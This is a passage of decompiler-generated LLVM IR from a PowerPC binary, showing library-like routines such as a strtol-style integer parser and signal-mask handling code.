  uselistorder i32 %v0_1000936c.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_10009360.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_10009310, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_10009300, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 10, 1, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_100093f8, { 1, 0 }
  uselistorder label %dec_label_pc_100093d0, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000930c, { 1, 0 }
}

define i32 @function_10009410(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009410:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 10, i32* %r30.global-to-local, align 4
  store i32 1, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_10009448 = load i32, i32* bitcast (i32** @global_var_1001b284.382 to i32*), align 4
  %v2_1000945427 = load i8, i8* %arg1, align 1
  %v3_1000945428 = zext i8 %v2_1000945427 to i32
  %v1_1000945829 = mul nuw nsw i32 %v3_1000945428, 2
  %v2_1000945c30 = add i32 %v1_1000945829, %v3_10009448
  %v3_1000945c31 = inttoptr i32 %v2_1000945c30 to i16*
  %v4_1000945c32 = load i16, i16* %v3_1000945c31, align 2
  %v1_1000946034 = and i16 %v4_1000945c32, 32
  %v3_1000946035 = icmp eq i16 %v1_1000946034, 0
  br i1 %v3_1000946035, label %dec_label_pc_10009468, label %dec_label_pc_10009450

dec_label_pc_10009450:                            ; preds = %dec_label_pc_10009410, %dec_label_pc_10009450
  %v0_1000948836 = phi i32 [ %v1_10009450, %dec_label_pc_10009450 ], [ %tmp, %dec_label_pc_10009410 ]
  %v1_10009450 = add i32 %v0_1000948836, 1
  store i32 %v1_10009450, i32* %r31.global-to-local, align 4
  %v1_10009454 = inttoptr i32 %v1_10009450 to i8*
  %v2_10009454 = load i8, i8* %v1_10009454, align 1
  %v3_10009454 = zext i8 %v2_10009454 to i32
  %v1_10009458 = mul nuw nsw i32 %v3_10009454, 2
  %v2_1000945c = add i32 %v1_10009458, %v3_10009448
  %v3_1000945c = inttoptr i32 %v2_1000945c to i16*
  %v4_1000945c = load i16, i16* %v3_1000945c, align 2
  %v1_10009460 = and i16 %v4_1000945c, 32
  %v3_10009460 = icmp eq i16 %v1_10009460, 0
  br i1 %v3_10009460, label %dec_label_pc_10009468, label %dec_label_pc_10009450

dec_label_pc_10009468:                            ; preds = %dec_label_pc_10009450, %dec_label_pc_10009410
  %v0_10009488.lcssa = phi i32 [ %tmp, %dec_label_pc_10009410 ], [ %v1_10009450, %dec_label_pc_10009450 ]
  %v2_10009454.lcssa = phi i8 [ %v2_1000945427, %dec_label_pc_10009410 ], [ %v2_10009454, %dec_label_pc_10009450 ]
  %v3_10009468 = icmp eq i8 %v2_10009454.lcssa, 43
  br i1 %v3_10009468, label %dec_label_pc_10009488, label %dec_label_pc_10009470

dec_label_pc_10009470:                            ; preds = %dec_label_pc_10009468
  %v3_10009470 = icmp eq i8 %v2_10009454.lcssa, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_10009470, label %dec_label_pc_10009488, label %dec_label_pc_1000948c

dec_label_pc_10009488:                            ; preds = %dec_label_pc_10009468, %dec_label_pc_10009470
  %storemerge = phi i32 [ 1, %dec_label_pc_10009470 ], [ 0, %dec_label_pc_10009468 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_10009488 = add i32 %v0_10009488.lcssa, 1
  store i32 %v1_10009488, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000948c

dec_label_pc_1000948c:                            ; preds = %dec_label_pc_10009470, %dec_label_pc_10009488
  %v1_1000948c = call i32 @__asm_rlwinm.(i32 10, i32 0, i32 28, i32 26)
  %v4_1000948c = icmp eq i32 %v1_1000948c, 0
  br i1 %v4_1000948c, label %dec_label_pc_10009498, label %dec_label_pc_1000948c.dec_label_pc_100094d4_crit_edge

dec_label_pc_1000948c.dec_label_pc_100094d4_crit_edge: ; preds = %dec_label_pc_1000948c
  %v0_100094d4.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100094d4

dec_label_pc_10009498:                            ; preds = %dec_label_pc_1000948c
  %v0_10009498 = load i32, i32* %r31.global-to-local, align 4
  %v1_10009498 = inttoptr i32 %v0_10009498 to i8*
  %v2_10009498 = load i8, i8* %v1_10009498, align 1
  %v0_1000949c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000949c = add i32 %v0_1000949c, 10
  store i32 %v1_1000949c, i32* %r30.global-to-local, align 4
  %v3_100094a0 = icmp eq i8 %v2_10009498, 48
  br i1 %v3_100094a0, label %dec_label_pc_100094a8, label %dec_label_pc_100094c8

dec_label_pc_100094a8:                            ; preds = %dec_label_pc_10009498
  %v1_100094a8 = add i32 %v0_10009498, 1
  %v2_100094a8 = inttoptr i32 %v1_100094a8 to i8*
  %v3_100094a8 = load i8, i8* %v2_100094a8, align 1
  %v4_100094a8 = zext i8 %v3_100094a8 to i32
  store i32 %v1_100094a8, i32* %r31.global-to-local, align 4
  %v1_100094ac = add i32 %v0_1000949c, 8
  store i32 %v1_100094ac, i32* %r30.global-to-local, align 4
  %v1_100094b0 = or i32 %v4_100094a8, 32
  %v3_100094b8 = icmp eq i32 %v1_100094b0, 120
  br i1 %v3_100094b8, label %dec_label_pc_100094c0, label %dec_label_pc_100094c8

dec_label_pc_100094c0:                            ; preds = %dec_label_pc_100094a8
  %v1_100094c0 = mul i32 %v1_100094ac, 2
  store i32 %v1_100094c0, i32* %r30.global-to-local, align 4
  %v1_100094c4 = add i32 %v0_10009498, 2
  store i32 %v1_100094c4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100094c8

dec_label_pc_100094c8:                            ; preds = %dec_label_pc_100094a8, %dec_label_pc_10009498, %dec_label_pc_100094c0
  %v0_1000957c15 = phi i32 [ %v1_100094a8, %dec_label_pc_100094c0 ], [ %tmp, %dec_label_pc_10009498 ], [ %v1_100094a8, %dec_label_pc_100094a8 ]
  %v0_100094c8 = phi i32 [ %v1_100094c0, %dec_label_pc_100094c0 ], [ %v1_1000949c, %dec_label_pc_10009498 ], [ %v1_100094ac, %dec_label_pc_100094a8 ]
  %tmp22 = icmp slt i32 %v0_100094c8, 17
  br i1 %tmp22, label %dec_label_pc_100094d4, label %dec_label_pc_100094d0

dec_label_pc_100094d0:                            ; preds = %dec_label_pc_100094c8
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100094d4

dec_label_pc_100094d4:                            ; preds = %dec_label_pc_1000948c.dec_label_pc_100094d4_crit_edge, %dec_label_pc_100094c8, %dec_label_pc_100094d0
  %v0_1000957c14 = phi i32 [ %tmp, %dec_label_pc_1000948c.dec_label_pc_100094d4_crit_edge ], [ %v0_1000957c15, %dec_label_pc_100094c8 ], [ %v0_1000957c15, %dec_label_pc_100094d0 ]
  %v1_100094e8 = phi i32 [ %v0_100094d4.pre, %dec_label_pc_1000948c.dec_label_pc_100094d4_crit_edge ], [ %v0_100094c8, %dec_label_pc_100094c8 ], [ 16, %dec_label_pc_100094d0 ]
  %v1_100094d4 = add i32 %v1_100094e8, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_100094dc = icmp ugt i32 %v1_100094d4, 34
  br i1 %v2_100094dc, label %dec_label_pc_10009574, label %dec_label_pc_100094e4

dec_label_pc_100094e4:                            ; preds = %dec_label_pc_100094d4
  %v2_100094e8 = udiv i32 -1, %v1_100094e8
  store i32 %v2_100094e8, i32* @r29, align 4
  %v2_100094ec = mul i32 %v2_100094e8, %v1_100094e8
  %v1_100094f0 = sub i32 -1, %v2_100094ec
  %v1_100094f4 = urem i32 %v1_100094f0, 256
  store i32 %v1_100094f4, i32* @r27, align 4
  %v0_10009500.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009500

dec_label_pc_100094fc:                            ; preds = %dec_label_pc_10009568, %dec_label_pc_10009550
  %v1_10009504.pre = phi i32 [ %v1_10009508, %dec_label_pc_10009568 ], [ %v1_10009504.pre.pre, %dec_label_pc_10009550 ]
  %v0_10009504.pre = phi i32 [ %v2_1000956c, %dec_label_pc_10009568 ], [ %v0_10009504.pre.pre, %dec_label_pc_10009550 ]
  %v0_100094fc = phi i32 [ %v1_1000950c, %dec_label_pc_10009568 ], [ %v0_100094fc.pre, %dec_label_pc_10009550 ]
  br label %dec_label_pc_10009500

dec_label_pc_10009500:                            ; preds = %dec_label_pc_100094e4, %dec_label_pc_100094fc
  %v0_1000957c12 = phi i32 [ %v0_1000957c14, %dec_label_pc_100094e4 ], [ %v0_100094fc, %dec_label_pc_100094fc ]
  %v0_1000950c = phi i32 [ %v0_10009500.pre, %dec_label_pc_100094e4 ], [ %v0_100094fc, %dec_label_pc_100094fc ]
  %v1_10009508 = phi i32 [ %v2_100094e8, %dec_label_pc_100094e4 ], [ %v1_10009504.pre, %dec_label_pc_100094fc ]
  %v0_10009568 = phi i32 [ 0, %dec_label_pc_100094e4 ], [ %v0_10009504.pre, %dec_label_pc_100094fc ]
  %v1_10009500 = inttoptr i32 %v0_1000950c to i8*
  %v2_10009500 = load i8, i8* %v1_10009500, align 1
  %v3_10009500 = zext i8 %v2_10009500 to i32
  %v3_10009504 = icmp ugt i32 %v0_10009568, %v1_10009508
  %v1_1000950c = add i32 %v0_1000950c, 1
  store i32 %v1_1000950c, i32* %r31.global-to-local, align 4
  %v1_10009510 = add nsw i32 %v3_10009500, -48
  %v1_10009514 = or i32 %v3_10009500, 32
  %v1_10009518 = urem i32 %v1_10009510, 256
  %tmp23 = icmp ult i32 %v1_10009518, 10
  br i1 %tmp23, label %dec_label_pc_10009538, label %dec_label_pc_10009528

dec_label_pc_10009528:                            ; preds = %dec_label_pc_10009500
  %tmp24 = icmp ult i32 %v1_10009514, 97
  br i1 %tmp24, label %dec_label_pc_10009538, label %dec_label_pc_10009534

dec_label_pc_10009534:                            ; preds = %dec_label_pc_10009528
  %v1_10009528 = add nsw i32 %v1_10009514, -87
  %v1_10009534 = urem i32 %v1_10009528, 256
  br label %dec_label_pc_10009538

dec_label_pc_10009538:                            ; preds = %dec_label_pc_10009528, %dec_label_pc_10009500, %dec_label_pc_10009534
  %v1_1000956c = phi i32 [ 40, %dec_label_pc_10009528 ], [ %v1_10009518, %dec_label_pc_10009500 ], [ %v1_10009534, %dec_label_pc_10009534 ]
  %v1_10009538 = load i32, i32* %r30.global-to-local, align 4
  %v2_10009538 = icmp slt i32 %v1_1000956c, %v1_10009538
  br i1 %v2_10009538, label %dec_label_pc_10009540, label %dec_label_pc_10009574

dec_label_pc_10009540:                            ; preds = %dec_label_pc_10009538
  br i1 %v3_10009504, label %dec_label_pc_10009550, label %dec_label_pc_10009544

dec_label_pc_10009544:                            ; preds = %dec_label_pc_10009540
  %v1_10009544 = load i32, i32* @r27, align 4
  %v0_10009548.not = icmp ne i32 %v0_10009568, %v1_10009508
  %tmp25 = icmp ule i32 %v1_1000956c, %v1_10009544
  %or.cond = or i1 %tmp25, %v0_10009548.not
  br i1 %or.cond, label %dec_label_pc_10009568, label %dec_label_pc_10009550

dec_label_pc_10009550:                            ; preds = %dec_label_pc_10009544, %dec_label_pc_10009540
  %v0_10009550 = call i32 @function_10008484()
  %v0_10009554 = load i32, i32* @r28, align 4
  %v1_10009554 = load i32, i32* %r26.global-to-local, align 4
  %v2_10009554 = and i32 %v1_10009554, %v0_10009554
  store i32 %v2_10009554, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_10009560 = inttoptr i32 %v0_10009550 to i32*
  store i32 34, i32* %v2_10009560, align 4
  %v0_100094fc.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10009504.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10009504.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100094fc

dec_label_pc_10009568:                            ; preds = %dec_label_pc_10009544
  %v2_10009568 = mul i32 %v1_10009538, %v0_10009568
  %v2_1000956c = add i32 %v2_10009568, %v1_1000956c
  store i32 %v2_1000956c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100094fc

dec_label_pc_10009574:                            ; preds = %dec_label_pc_10009538, %dec_label_pc_100094d4
  %v0_1000957c = phi i32 [ %v0_1000957c14, %dec_label_pc_100094d4 ], [ %v0_1000957c12, %dec_label_pc_10009538 ]
  %v0_10009574 = load i32, i32* %r25.global-to-local, align 4
  %v3_10009574 = icmp eq i32 %v0_10009574, 0
  br i1 %v3_10009574, label %dec_label_pc_10009580, label %dec_label_pc_1000957c

dec_label_pc_1000957c:                            ; preds = %dec_label_pc_10009574
  %v2_1000957c = inttoptr i32 %v0_10009574 to i32*
  store i32 %v0_1000957c, i32* %v2_1000957c, align 4
  br label %dec_label_pc_10009580

dec_label_pc_10009580:                            ; preds = %dec_label_pc_10009574, %dec_label_pc_1000957c
  %v0_10009580 = load i32, i32* %r26.global-to-local, align 4
  %v3_10009580 = icmp eq i32 %v0_10009580, 0
  %v0_10009584 = load i32, i32* @r28, align 4
  %v1_10009584 = sub i32 0, %v0_10009584
  %tmp40 = lshr i32 %v1_10009584, 31
  %tmp41 = add nuw i32 %tmp40, 2147483647
  store i32 %tmp41, i32* @r31, align 4
  %v0_100095c4.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_10009580, label %dec_label_pc_100095b4, label %dec_label_pc_1000959c

dec_label_pc_1000959c:                            ; preds = %dec_label_pc_10009580
  %v3_1000959c = icmp ugt i32 %v0_100095c4.pre.pre, %tmp41
  br i1 %v3_1000959c, label %dec_label_pc_100095a4, label %dec_label_pc_100095b4

dec_label_pc_100095a4:                            ; preds = %dec_label_pc_1000959c
  %v0_100095a4 = call i32 @function_10008484()
  %v2_100095ac = inttoptr i32 %v0_100095a4 to i32*
  store i32 34, i32* %v2_100095ac, align 4
  %v0_100095b0 = load i32, i32* @r31, align 4
  store i32 %v0_100095b0, i32* %r8.global-to-local, align 4
  %v0_100095b4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100095b4

dec_label_pc_100095b4:                            ; preds = %dec_label_pc_10009580, %dec_label_pc_1000959c, %dec_label_pc_100095a4
  %v0_100095c4.pre = phi i32 [ %v0_100095c4.pre.pre, %dec_label_pc_1000959c ], [ %v0_100095b0, %dec_label_pc_100095a4 ], [ %v0_100095c4.pre.pre, %dec_label_pc_10009580 ]
  %v0_100095b4 = phi i32 [ %v0_10009584, %dec_label_pc_1000959c ], [ %v0_100095b4.pre, %dec_label_pc_100095a4 ], [ %v0_10009584, %dec_label_pc_10009580 ]
  %v3_100095b4 = icmp eq i32 %v0_100095b4, 0
  br i1 %v3_100095b4, label %dec_label_pc_100095c0, label %dec_label_pc_100095bc

dec_label_pc_100095bc:                            ; preds = %dec_label_pc_100095b4
  %v1_100095bc = sub i32 0, %v0_100095c4.pre
  store i32 %v1_100095bc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100095c0

dec_label_pc_100095c0:                            ; preds = %dec_label_pc_100095b4, %dec_label_pc_100095bc
  %v0_100095c4 = phi i32 [ %v1_100095bc, %dec_label_pc_100095bc ], [ %v0_100095c4.pre, %dec_label_pc_100095b4 ]
  ret i32 %v0_100095c4

; uselistorder directives
  uselistorder i32 %v0_100095c4.pre, { 1, 0 }
  uselistorder i32 %v0_100095c4.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000956c, { 1, 0 }
  uselistorder i32 %v1_10009518, { 1, 0 }
  uselistorder i32 %v1_10009514, { 1, 0 }
  uselistorder i32 %v1_1000950c, { 1, 0 }
  uselistorder i32 %v3_10009500, { 1, 0 }
  uselistorder i32 %v0_10009568, { 1, 0, 2 }
  uselistorder i32 %v1_10009508, { 0, 2, 1 }
  uselistorder i32 %v0_100094fc, { 1, 0 }
  uselistorder i32 %v2_100094e8, { 1, 0, 2 }
  uselistorder i32 %v1_100094c0, { 1, 0 }
  uselistorder i32 %v1_100094ac, { 1, 0, 2 }
  uselistorder i8 %v2_10009454.lcssa, { 1, 0 }
  uselistorder i32 %v1_10009450, { 0, 2, 3, 1 }
  uselistorder i32 %v3_10009448, { 1, 0 }
  uselistorder i32 %tmp, { 3, 2, 0, 1, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder i32 34, { 0, 1, 5, 2, 6, 3, 7, 4, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 0, 7, 8, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100095c0, { 1, 0 }
  uselistorder label %dec_label_pc_100095b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009580, { 1, 0 }
  uselistorder label %dec_label_pc_10009538, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009500, { 1, 0 }
  uselistorder label %dec_label_pc_100094d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100094c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000948c, { 1, 0 }
  uselistorder label %dec_label_pc_10009488, { 1, 0 }
  uselistorder label %dec_label_pc_10009450, { 1, 0 }
}

define i32 @function_100095d8() local_unnamed_addr {
dec_label_pc_100095d8:
  %stack_var_-40 = alloca i32, align 4
  %v2_100095f0 = ptrtoint i32* %stack_var_-40 to i32
  %v0_100095fc = load i32, i32* @r3, align 4
  store i32 %v0_100095fc, i32* @r31, align 4
  store i32 %v2_100095f0, i32* @r3, align 4
  %v3_10009608 = call i32 @function_100098cc(i32 %v2_100095f0, i32 ptrtoint ([3 x i8]* @global_var_100098c4.361 to i32))
  %v0_10009610 = call i32 @function_100098c4()
  %v3_10009618 = load i32, i32* @global_var_1001b2a4.385, align 4
  %v3_1000961c = icmp eq i32 %v3_10009618, 0
  br i1 %v3_1000961c, label %dec_label_pc_10009630, label %dec_label_pc_10009624

dec_label_pc_10009624:                            ; preds = %dec_label_pc_100095d8
  %v0_10009624 = load i32, i32* @r31, align 4
  %v3_1000962c = call i32 @unknown_0(i32 %v0_10009624, i32 268566528)
  br label %dec_label_pc_10009630

dec_label_pc_10009630:                            ; preds = %dec_label_pc_100095d8, %dec_label_pc_10009624
  store i32 %v2_100095f0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v2_10009638 = call i32 @function_100098cc(i32 %v2_100095f0, i32 1)
  store i32 %v2_10009638, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009640.387 to i32), i32* @lr, align 4
  %v1_1000963c = call i32 @function_10009830(i32 %v2_10009638)
  %v0_10009654 = load i32, i32* @r31, align 4
  %v1_10009658 = call i32 @function_10009c64(i32 %v0_10009654)
  ret i32 %v1_10009658

; uselistorder directives
  uselistorder i32 %v2_100095f0, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32)* @function_100098cc, { 1, 0, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_10009630, { 1, 0 }
}

define i32 @function_1000965c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000965c:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000965c = icmp eq i32 %arg1, 0
  br i1 %v3_1000965c, label %dec_label_pc_10009810, label %dec_label_pc_1000968c.lr.ph

dec_label_pc_1000968c.lr.ph:                      ; preds = %dec_label_pc_1000965c
  %v2_10009680 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10009680, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000968c42 = add i32 %v2_10009680, 132
  %v3_1000968c43 = inttoptr i32 %v2_1000968c42 to i32*
  store i32 0, i32* %v3_1000968c43, align 4
  %v0_1000969044 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000969045 = add i32 %v0_1000969044, -1
  store i32 %v1_1000969045, i32* %r11.global-to-local, align 4
  %v1_1000969446 = mul i32 %v1_1000969045, 4
  %v1_1000969847 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000969848 = add i32 %v1_1000969847, %v1_1000969446
  %v0_1000969c49 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000969c50 = add i32 %v0_1000969c49, -1
  store i32 %v1_1000969c50, i32* %ctr.global-to-local, align 4
  %v2_1000969c51 = icmp eq i32 %v1_1000969c50, 0
  br i1 %v2_1000969c51, label %dec_label_pc_100096a0, label %dec_label_pc_1000968c.dec_label_pc_1000968c_crit_edge

dec_label_pc_1000968c.dec_label_pc_1000968c_crit_edge: ; preds = %dec_label_pc_1000968c.lr.ph, %dec_label_pc_1000968c.dec_label_pc_1000968c_crit_edge
  %v2_1000969852 = phi i32 [ %v2_10009698, %dec_label_pc_1000968c.dec_label_pc_1000968c_crit_edge ], [ %v2_1000969848, %dec_label_pc_1000968c.lr.ph ]
  %v0_1000968c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000968c = add i32 %v2_1000969852, 8
  %v3_1000968c = inttoptr i32 %v2_1000968c to i32*
  store i32 %v0_1000968c.pre, i32* %v3_1000968c, align 4
  %v0_10009690 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009690 = add i32 %v0_10009690, -1
  store i32 %v1_10009690, i32* %r11.global-to-local, align 4
  %v1_10009694 = mul i32 %v1_10009690, 4
  %v1_10009698 = load i32, i32* %r7.global-to-local, align 4
  %v2_10009698 = add i32 %v1_10009698, %v1_10009694
  %v0_1000969c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000969c = add i32 %v0_1000969c, -1
  store i32 %v1_1000969c, i32* %ctr.global-to-local, align 4
  %v2_1000969c = icmp eq i32 %v1_1000969c, 0
  br i1 %v2_1000969c, label %dec_label_pc_100096a0, label %dec_label_pc_1000968c.dec_label_pc_1000968c_crit_edge

dec_label_pc_100096a0:                            ; preds = %dec_label_pc_1000968c.dec_label_pc_1000968c_crit_edge, %dec_label_pc_1000968c.lr.ph
  %v0_100096b4.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_100096a0 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_100096a0, i32* @r29, align 4
  store i32 %v2_100096a0, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_100096b4.pre, i32* %stack_var_-440, align 4
  %v0_100096b8 = call i32 @function_10008d18()
  store i32 %v0_100096b8, i32* %r3.global-to-local, align 4
  %v1_100096bc = icmp slt i32 %v0_100096b8, 0
  br i1 %v1_100096bc, label %dec_label_pc_10009818, label %dec_label_pc_100096c4

dec_label_pc_100096c4:                            ; preds = %dec_label_pc_100096a0
  %v2_100096c4 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_100096c4, i32* @r31, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268474072, i32* @lr, align 4
  %v3_100096d4 = call i32 @function_100080c0(i32 0, i32 %v2_100096a0, i32 %v2_100096c4)
  store i32 %v3_100096d4, i32* %r3.global-to-local, align 4
  %v3_100096d8 = icmp eq i32 %v3_100096d4, 0
  br i1 %v3_100096d8, label %dec_label_pc_100096e0, label %dec_label_pc_10009818

dec_label_pc_100096e0:                            ; preds = %dec_label_pc_100096c4
  store i32 %v2_100096c4, i32* %r3.global-to-local, align 4
  %v2_100096e8 = call i32 @function_10008cf0(i32 %v2_100096c4, i32 17)
  store i32 %v2_100096e8, i32* %r3.global-to-local, align 4
  %v3_100096ec = icmp eq i32 %v2_100096e8, 0
  br i1 %v3_100096ec, label %dec_label_pc_1000970c.lr.ph, label %dec_label_pc_100097d8

dec_label_pc_1000970c.lr.ph:                      ; preds = %dec_label_pc_100096e0
  store i32 %v2_10009680, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000968c43, align 4
  %v0_1000971033 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000971034 = add i32 %v0_1000971033, -1
  store i32 %v1_1000971034, i32* %r11.global-to-local, align 4
  %v1_1000971435 = mul i32 %v1_1000971034, 4
  %v1_1000971836 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000971837 = add i32 %v1_1000971836, %v1_1000971435
  %v0_1000971c38 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000971c39 = add i32 %v0_1000971c38, -1
  store i32 %v1_1000971c39, i32* %ctr.global-to-local, align 4
  %v2_1000971c40 = icmp eq i32 %v1_1000971c39, 0
  br i1 %v2_1000971c40, label %dec_label_pc_10009720, label %dec_label_pc_1000970c.dec_label_pc_1000970c_crit_edge

dec_label_pc_1000970c.dec_label_pc_1000970c_crit_edge: ; preds = %dec_label_pc_1000970c.lr.ph, %dec_label_pc_1000970c.dec_label_pc_1000970c_crit_edge
  %v2_1000971841 = phi i32 [ %v2_10009718, %dec_label_pc_1000970c.dec_label_pc_1000970c_crit_edge ], [ %v2_1000971837, %dec_label_pc_1000970c.lr.ph ]
  %v0_1000970c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000970c = add i32 %v2_1000971841, 8
  %v3_1000970c = inttoptr i32 %v2_1000970c to i32*
  store i32 %v0_1000970c.pre, i32* %v3_1000970c, align 4
  %v0_10009710 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009710 = add i32 %v0_10009710, -1
  store i32 %v1_10009710, i32* %r11.global-to-local, align 4
  %v1_10009714 = mul i32 %v1_10009710, 4
  %v1_10009718 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009718 = add i32 %v1_10009718, %v1_10009714
  %v0_1000971c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000971c = add i32 %v0_1000971c, -1
  store i32 %v1_1000971c, i32* %ctr.global-to-local, align 4
  %v2_1000971c = icmp eq i32 %v1_1000971c, 0
  br i1 %v2_1000971c, label %dec_label_pc_10009720, label %dec_label_pc_1000970c.dec_label_pc_1000970c_crit_edge

dec_label_pc_10009720:                            ; preds = %dec_label_pc_1000970c.dec_label_pc_1000970c_crit_edge, %dec_label_pc_1000970c.lr.ph
  store i32 %v2_100096a0, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_10009728 = call i32 @function_10008d18()
  store i32 %v0_10009728, i32* %r3.global-to-local, align 4
  %v1_1000972c = icmp slt i32 %v0_10009728, 0
  br i1 %v1_1000972c, label %dec_label_pc_10009818, label %dec_label_pc_10009734

dec_label_pc_10009734:                            ; preds = %dec_label_pc_10009720
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000973c = ptrtoint i32* %stack_var_-176 to i32
  store i32 268474180, i32* @lr, align 4
  %v4_10009740 = call i32 @function_1000a40c(i32 17, i32* null, i32 %v2_1000973c)
  store i32 %v4_10009740, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_10009740, -1
  br i1 %tmp30, label %dec_label_pc_10009774, label %dec_label_pc_1000974c

dec_label_pc_1000974c:                            ; preds = %dec_label_pc_10009734
  %v0_1000974c = call i32 @function_10008484()
  store i32 %v0_1000974c, i32* %r3.global-to-local, align 4
  %v1_10009754 = inttoptr i32 %v0_1000974c to i32*
  %v2_10009754 = load i32, i32* %v1_10009754, align 4
  store i32 %v2_10009754, i32* @r28, align 4
  store i32 %v0_1000974c, i32* @r29, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268474216, i32* @lr, align 4
  %v3_10009764 = call i32 @function_100080c0(i32 2, i32 %v2_100096c4, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1000976c = load i32, i32* @r28, align 4
  %v1_1000976c = load i32, i32* @r29, align 4
  %v2_1000976c = inttoptr i32 %v1_1000976c to i32*
  store i32 %v0_1000976c, i32* %v2_1000976c, align 4
  %v0_1000982c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000981c

dec_label_pc_10009774:                            ; preds = %dec_label_pc_10009734
  %v3_10009774 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_100096c4, i32* @r28, align 4
  %v3_10009780 = icmp eq i32 %v3_10009774, 1
  br i1 %v3_10009780, label %dec_label_pc_10009788, label %dec_label_pc_100097bc

dec_label_pc_10009788:                            ; preds = %dec_label_pc_10009774
  store i32 %v2_10009680, i32* %r3.global-to-local, align 4
  store i32 268474260, i32* @lr, align 4
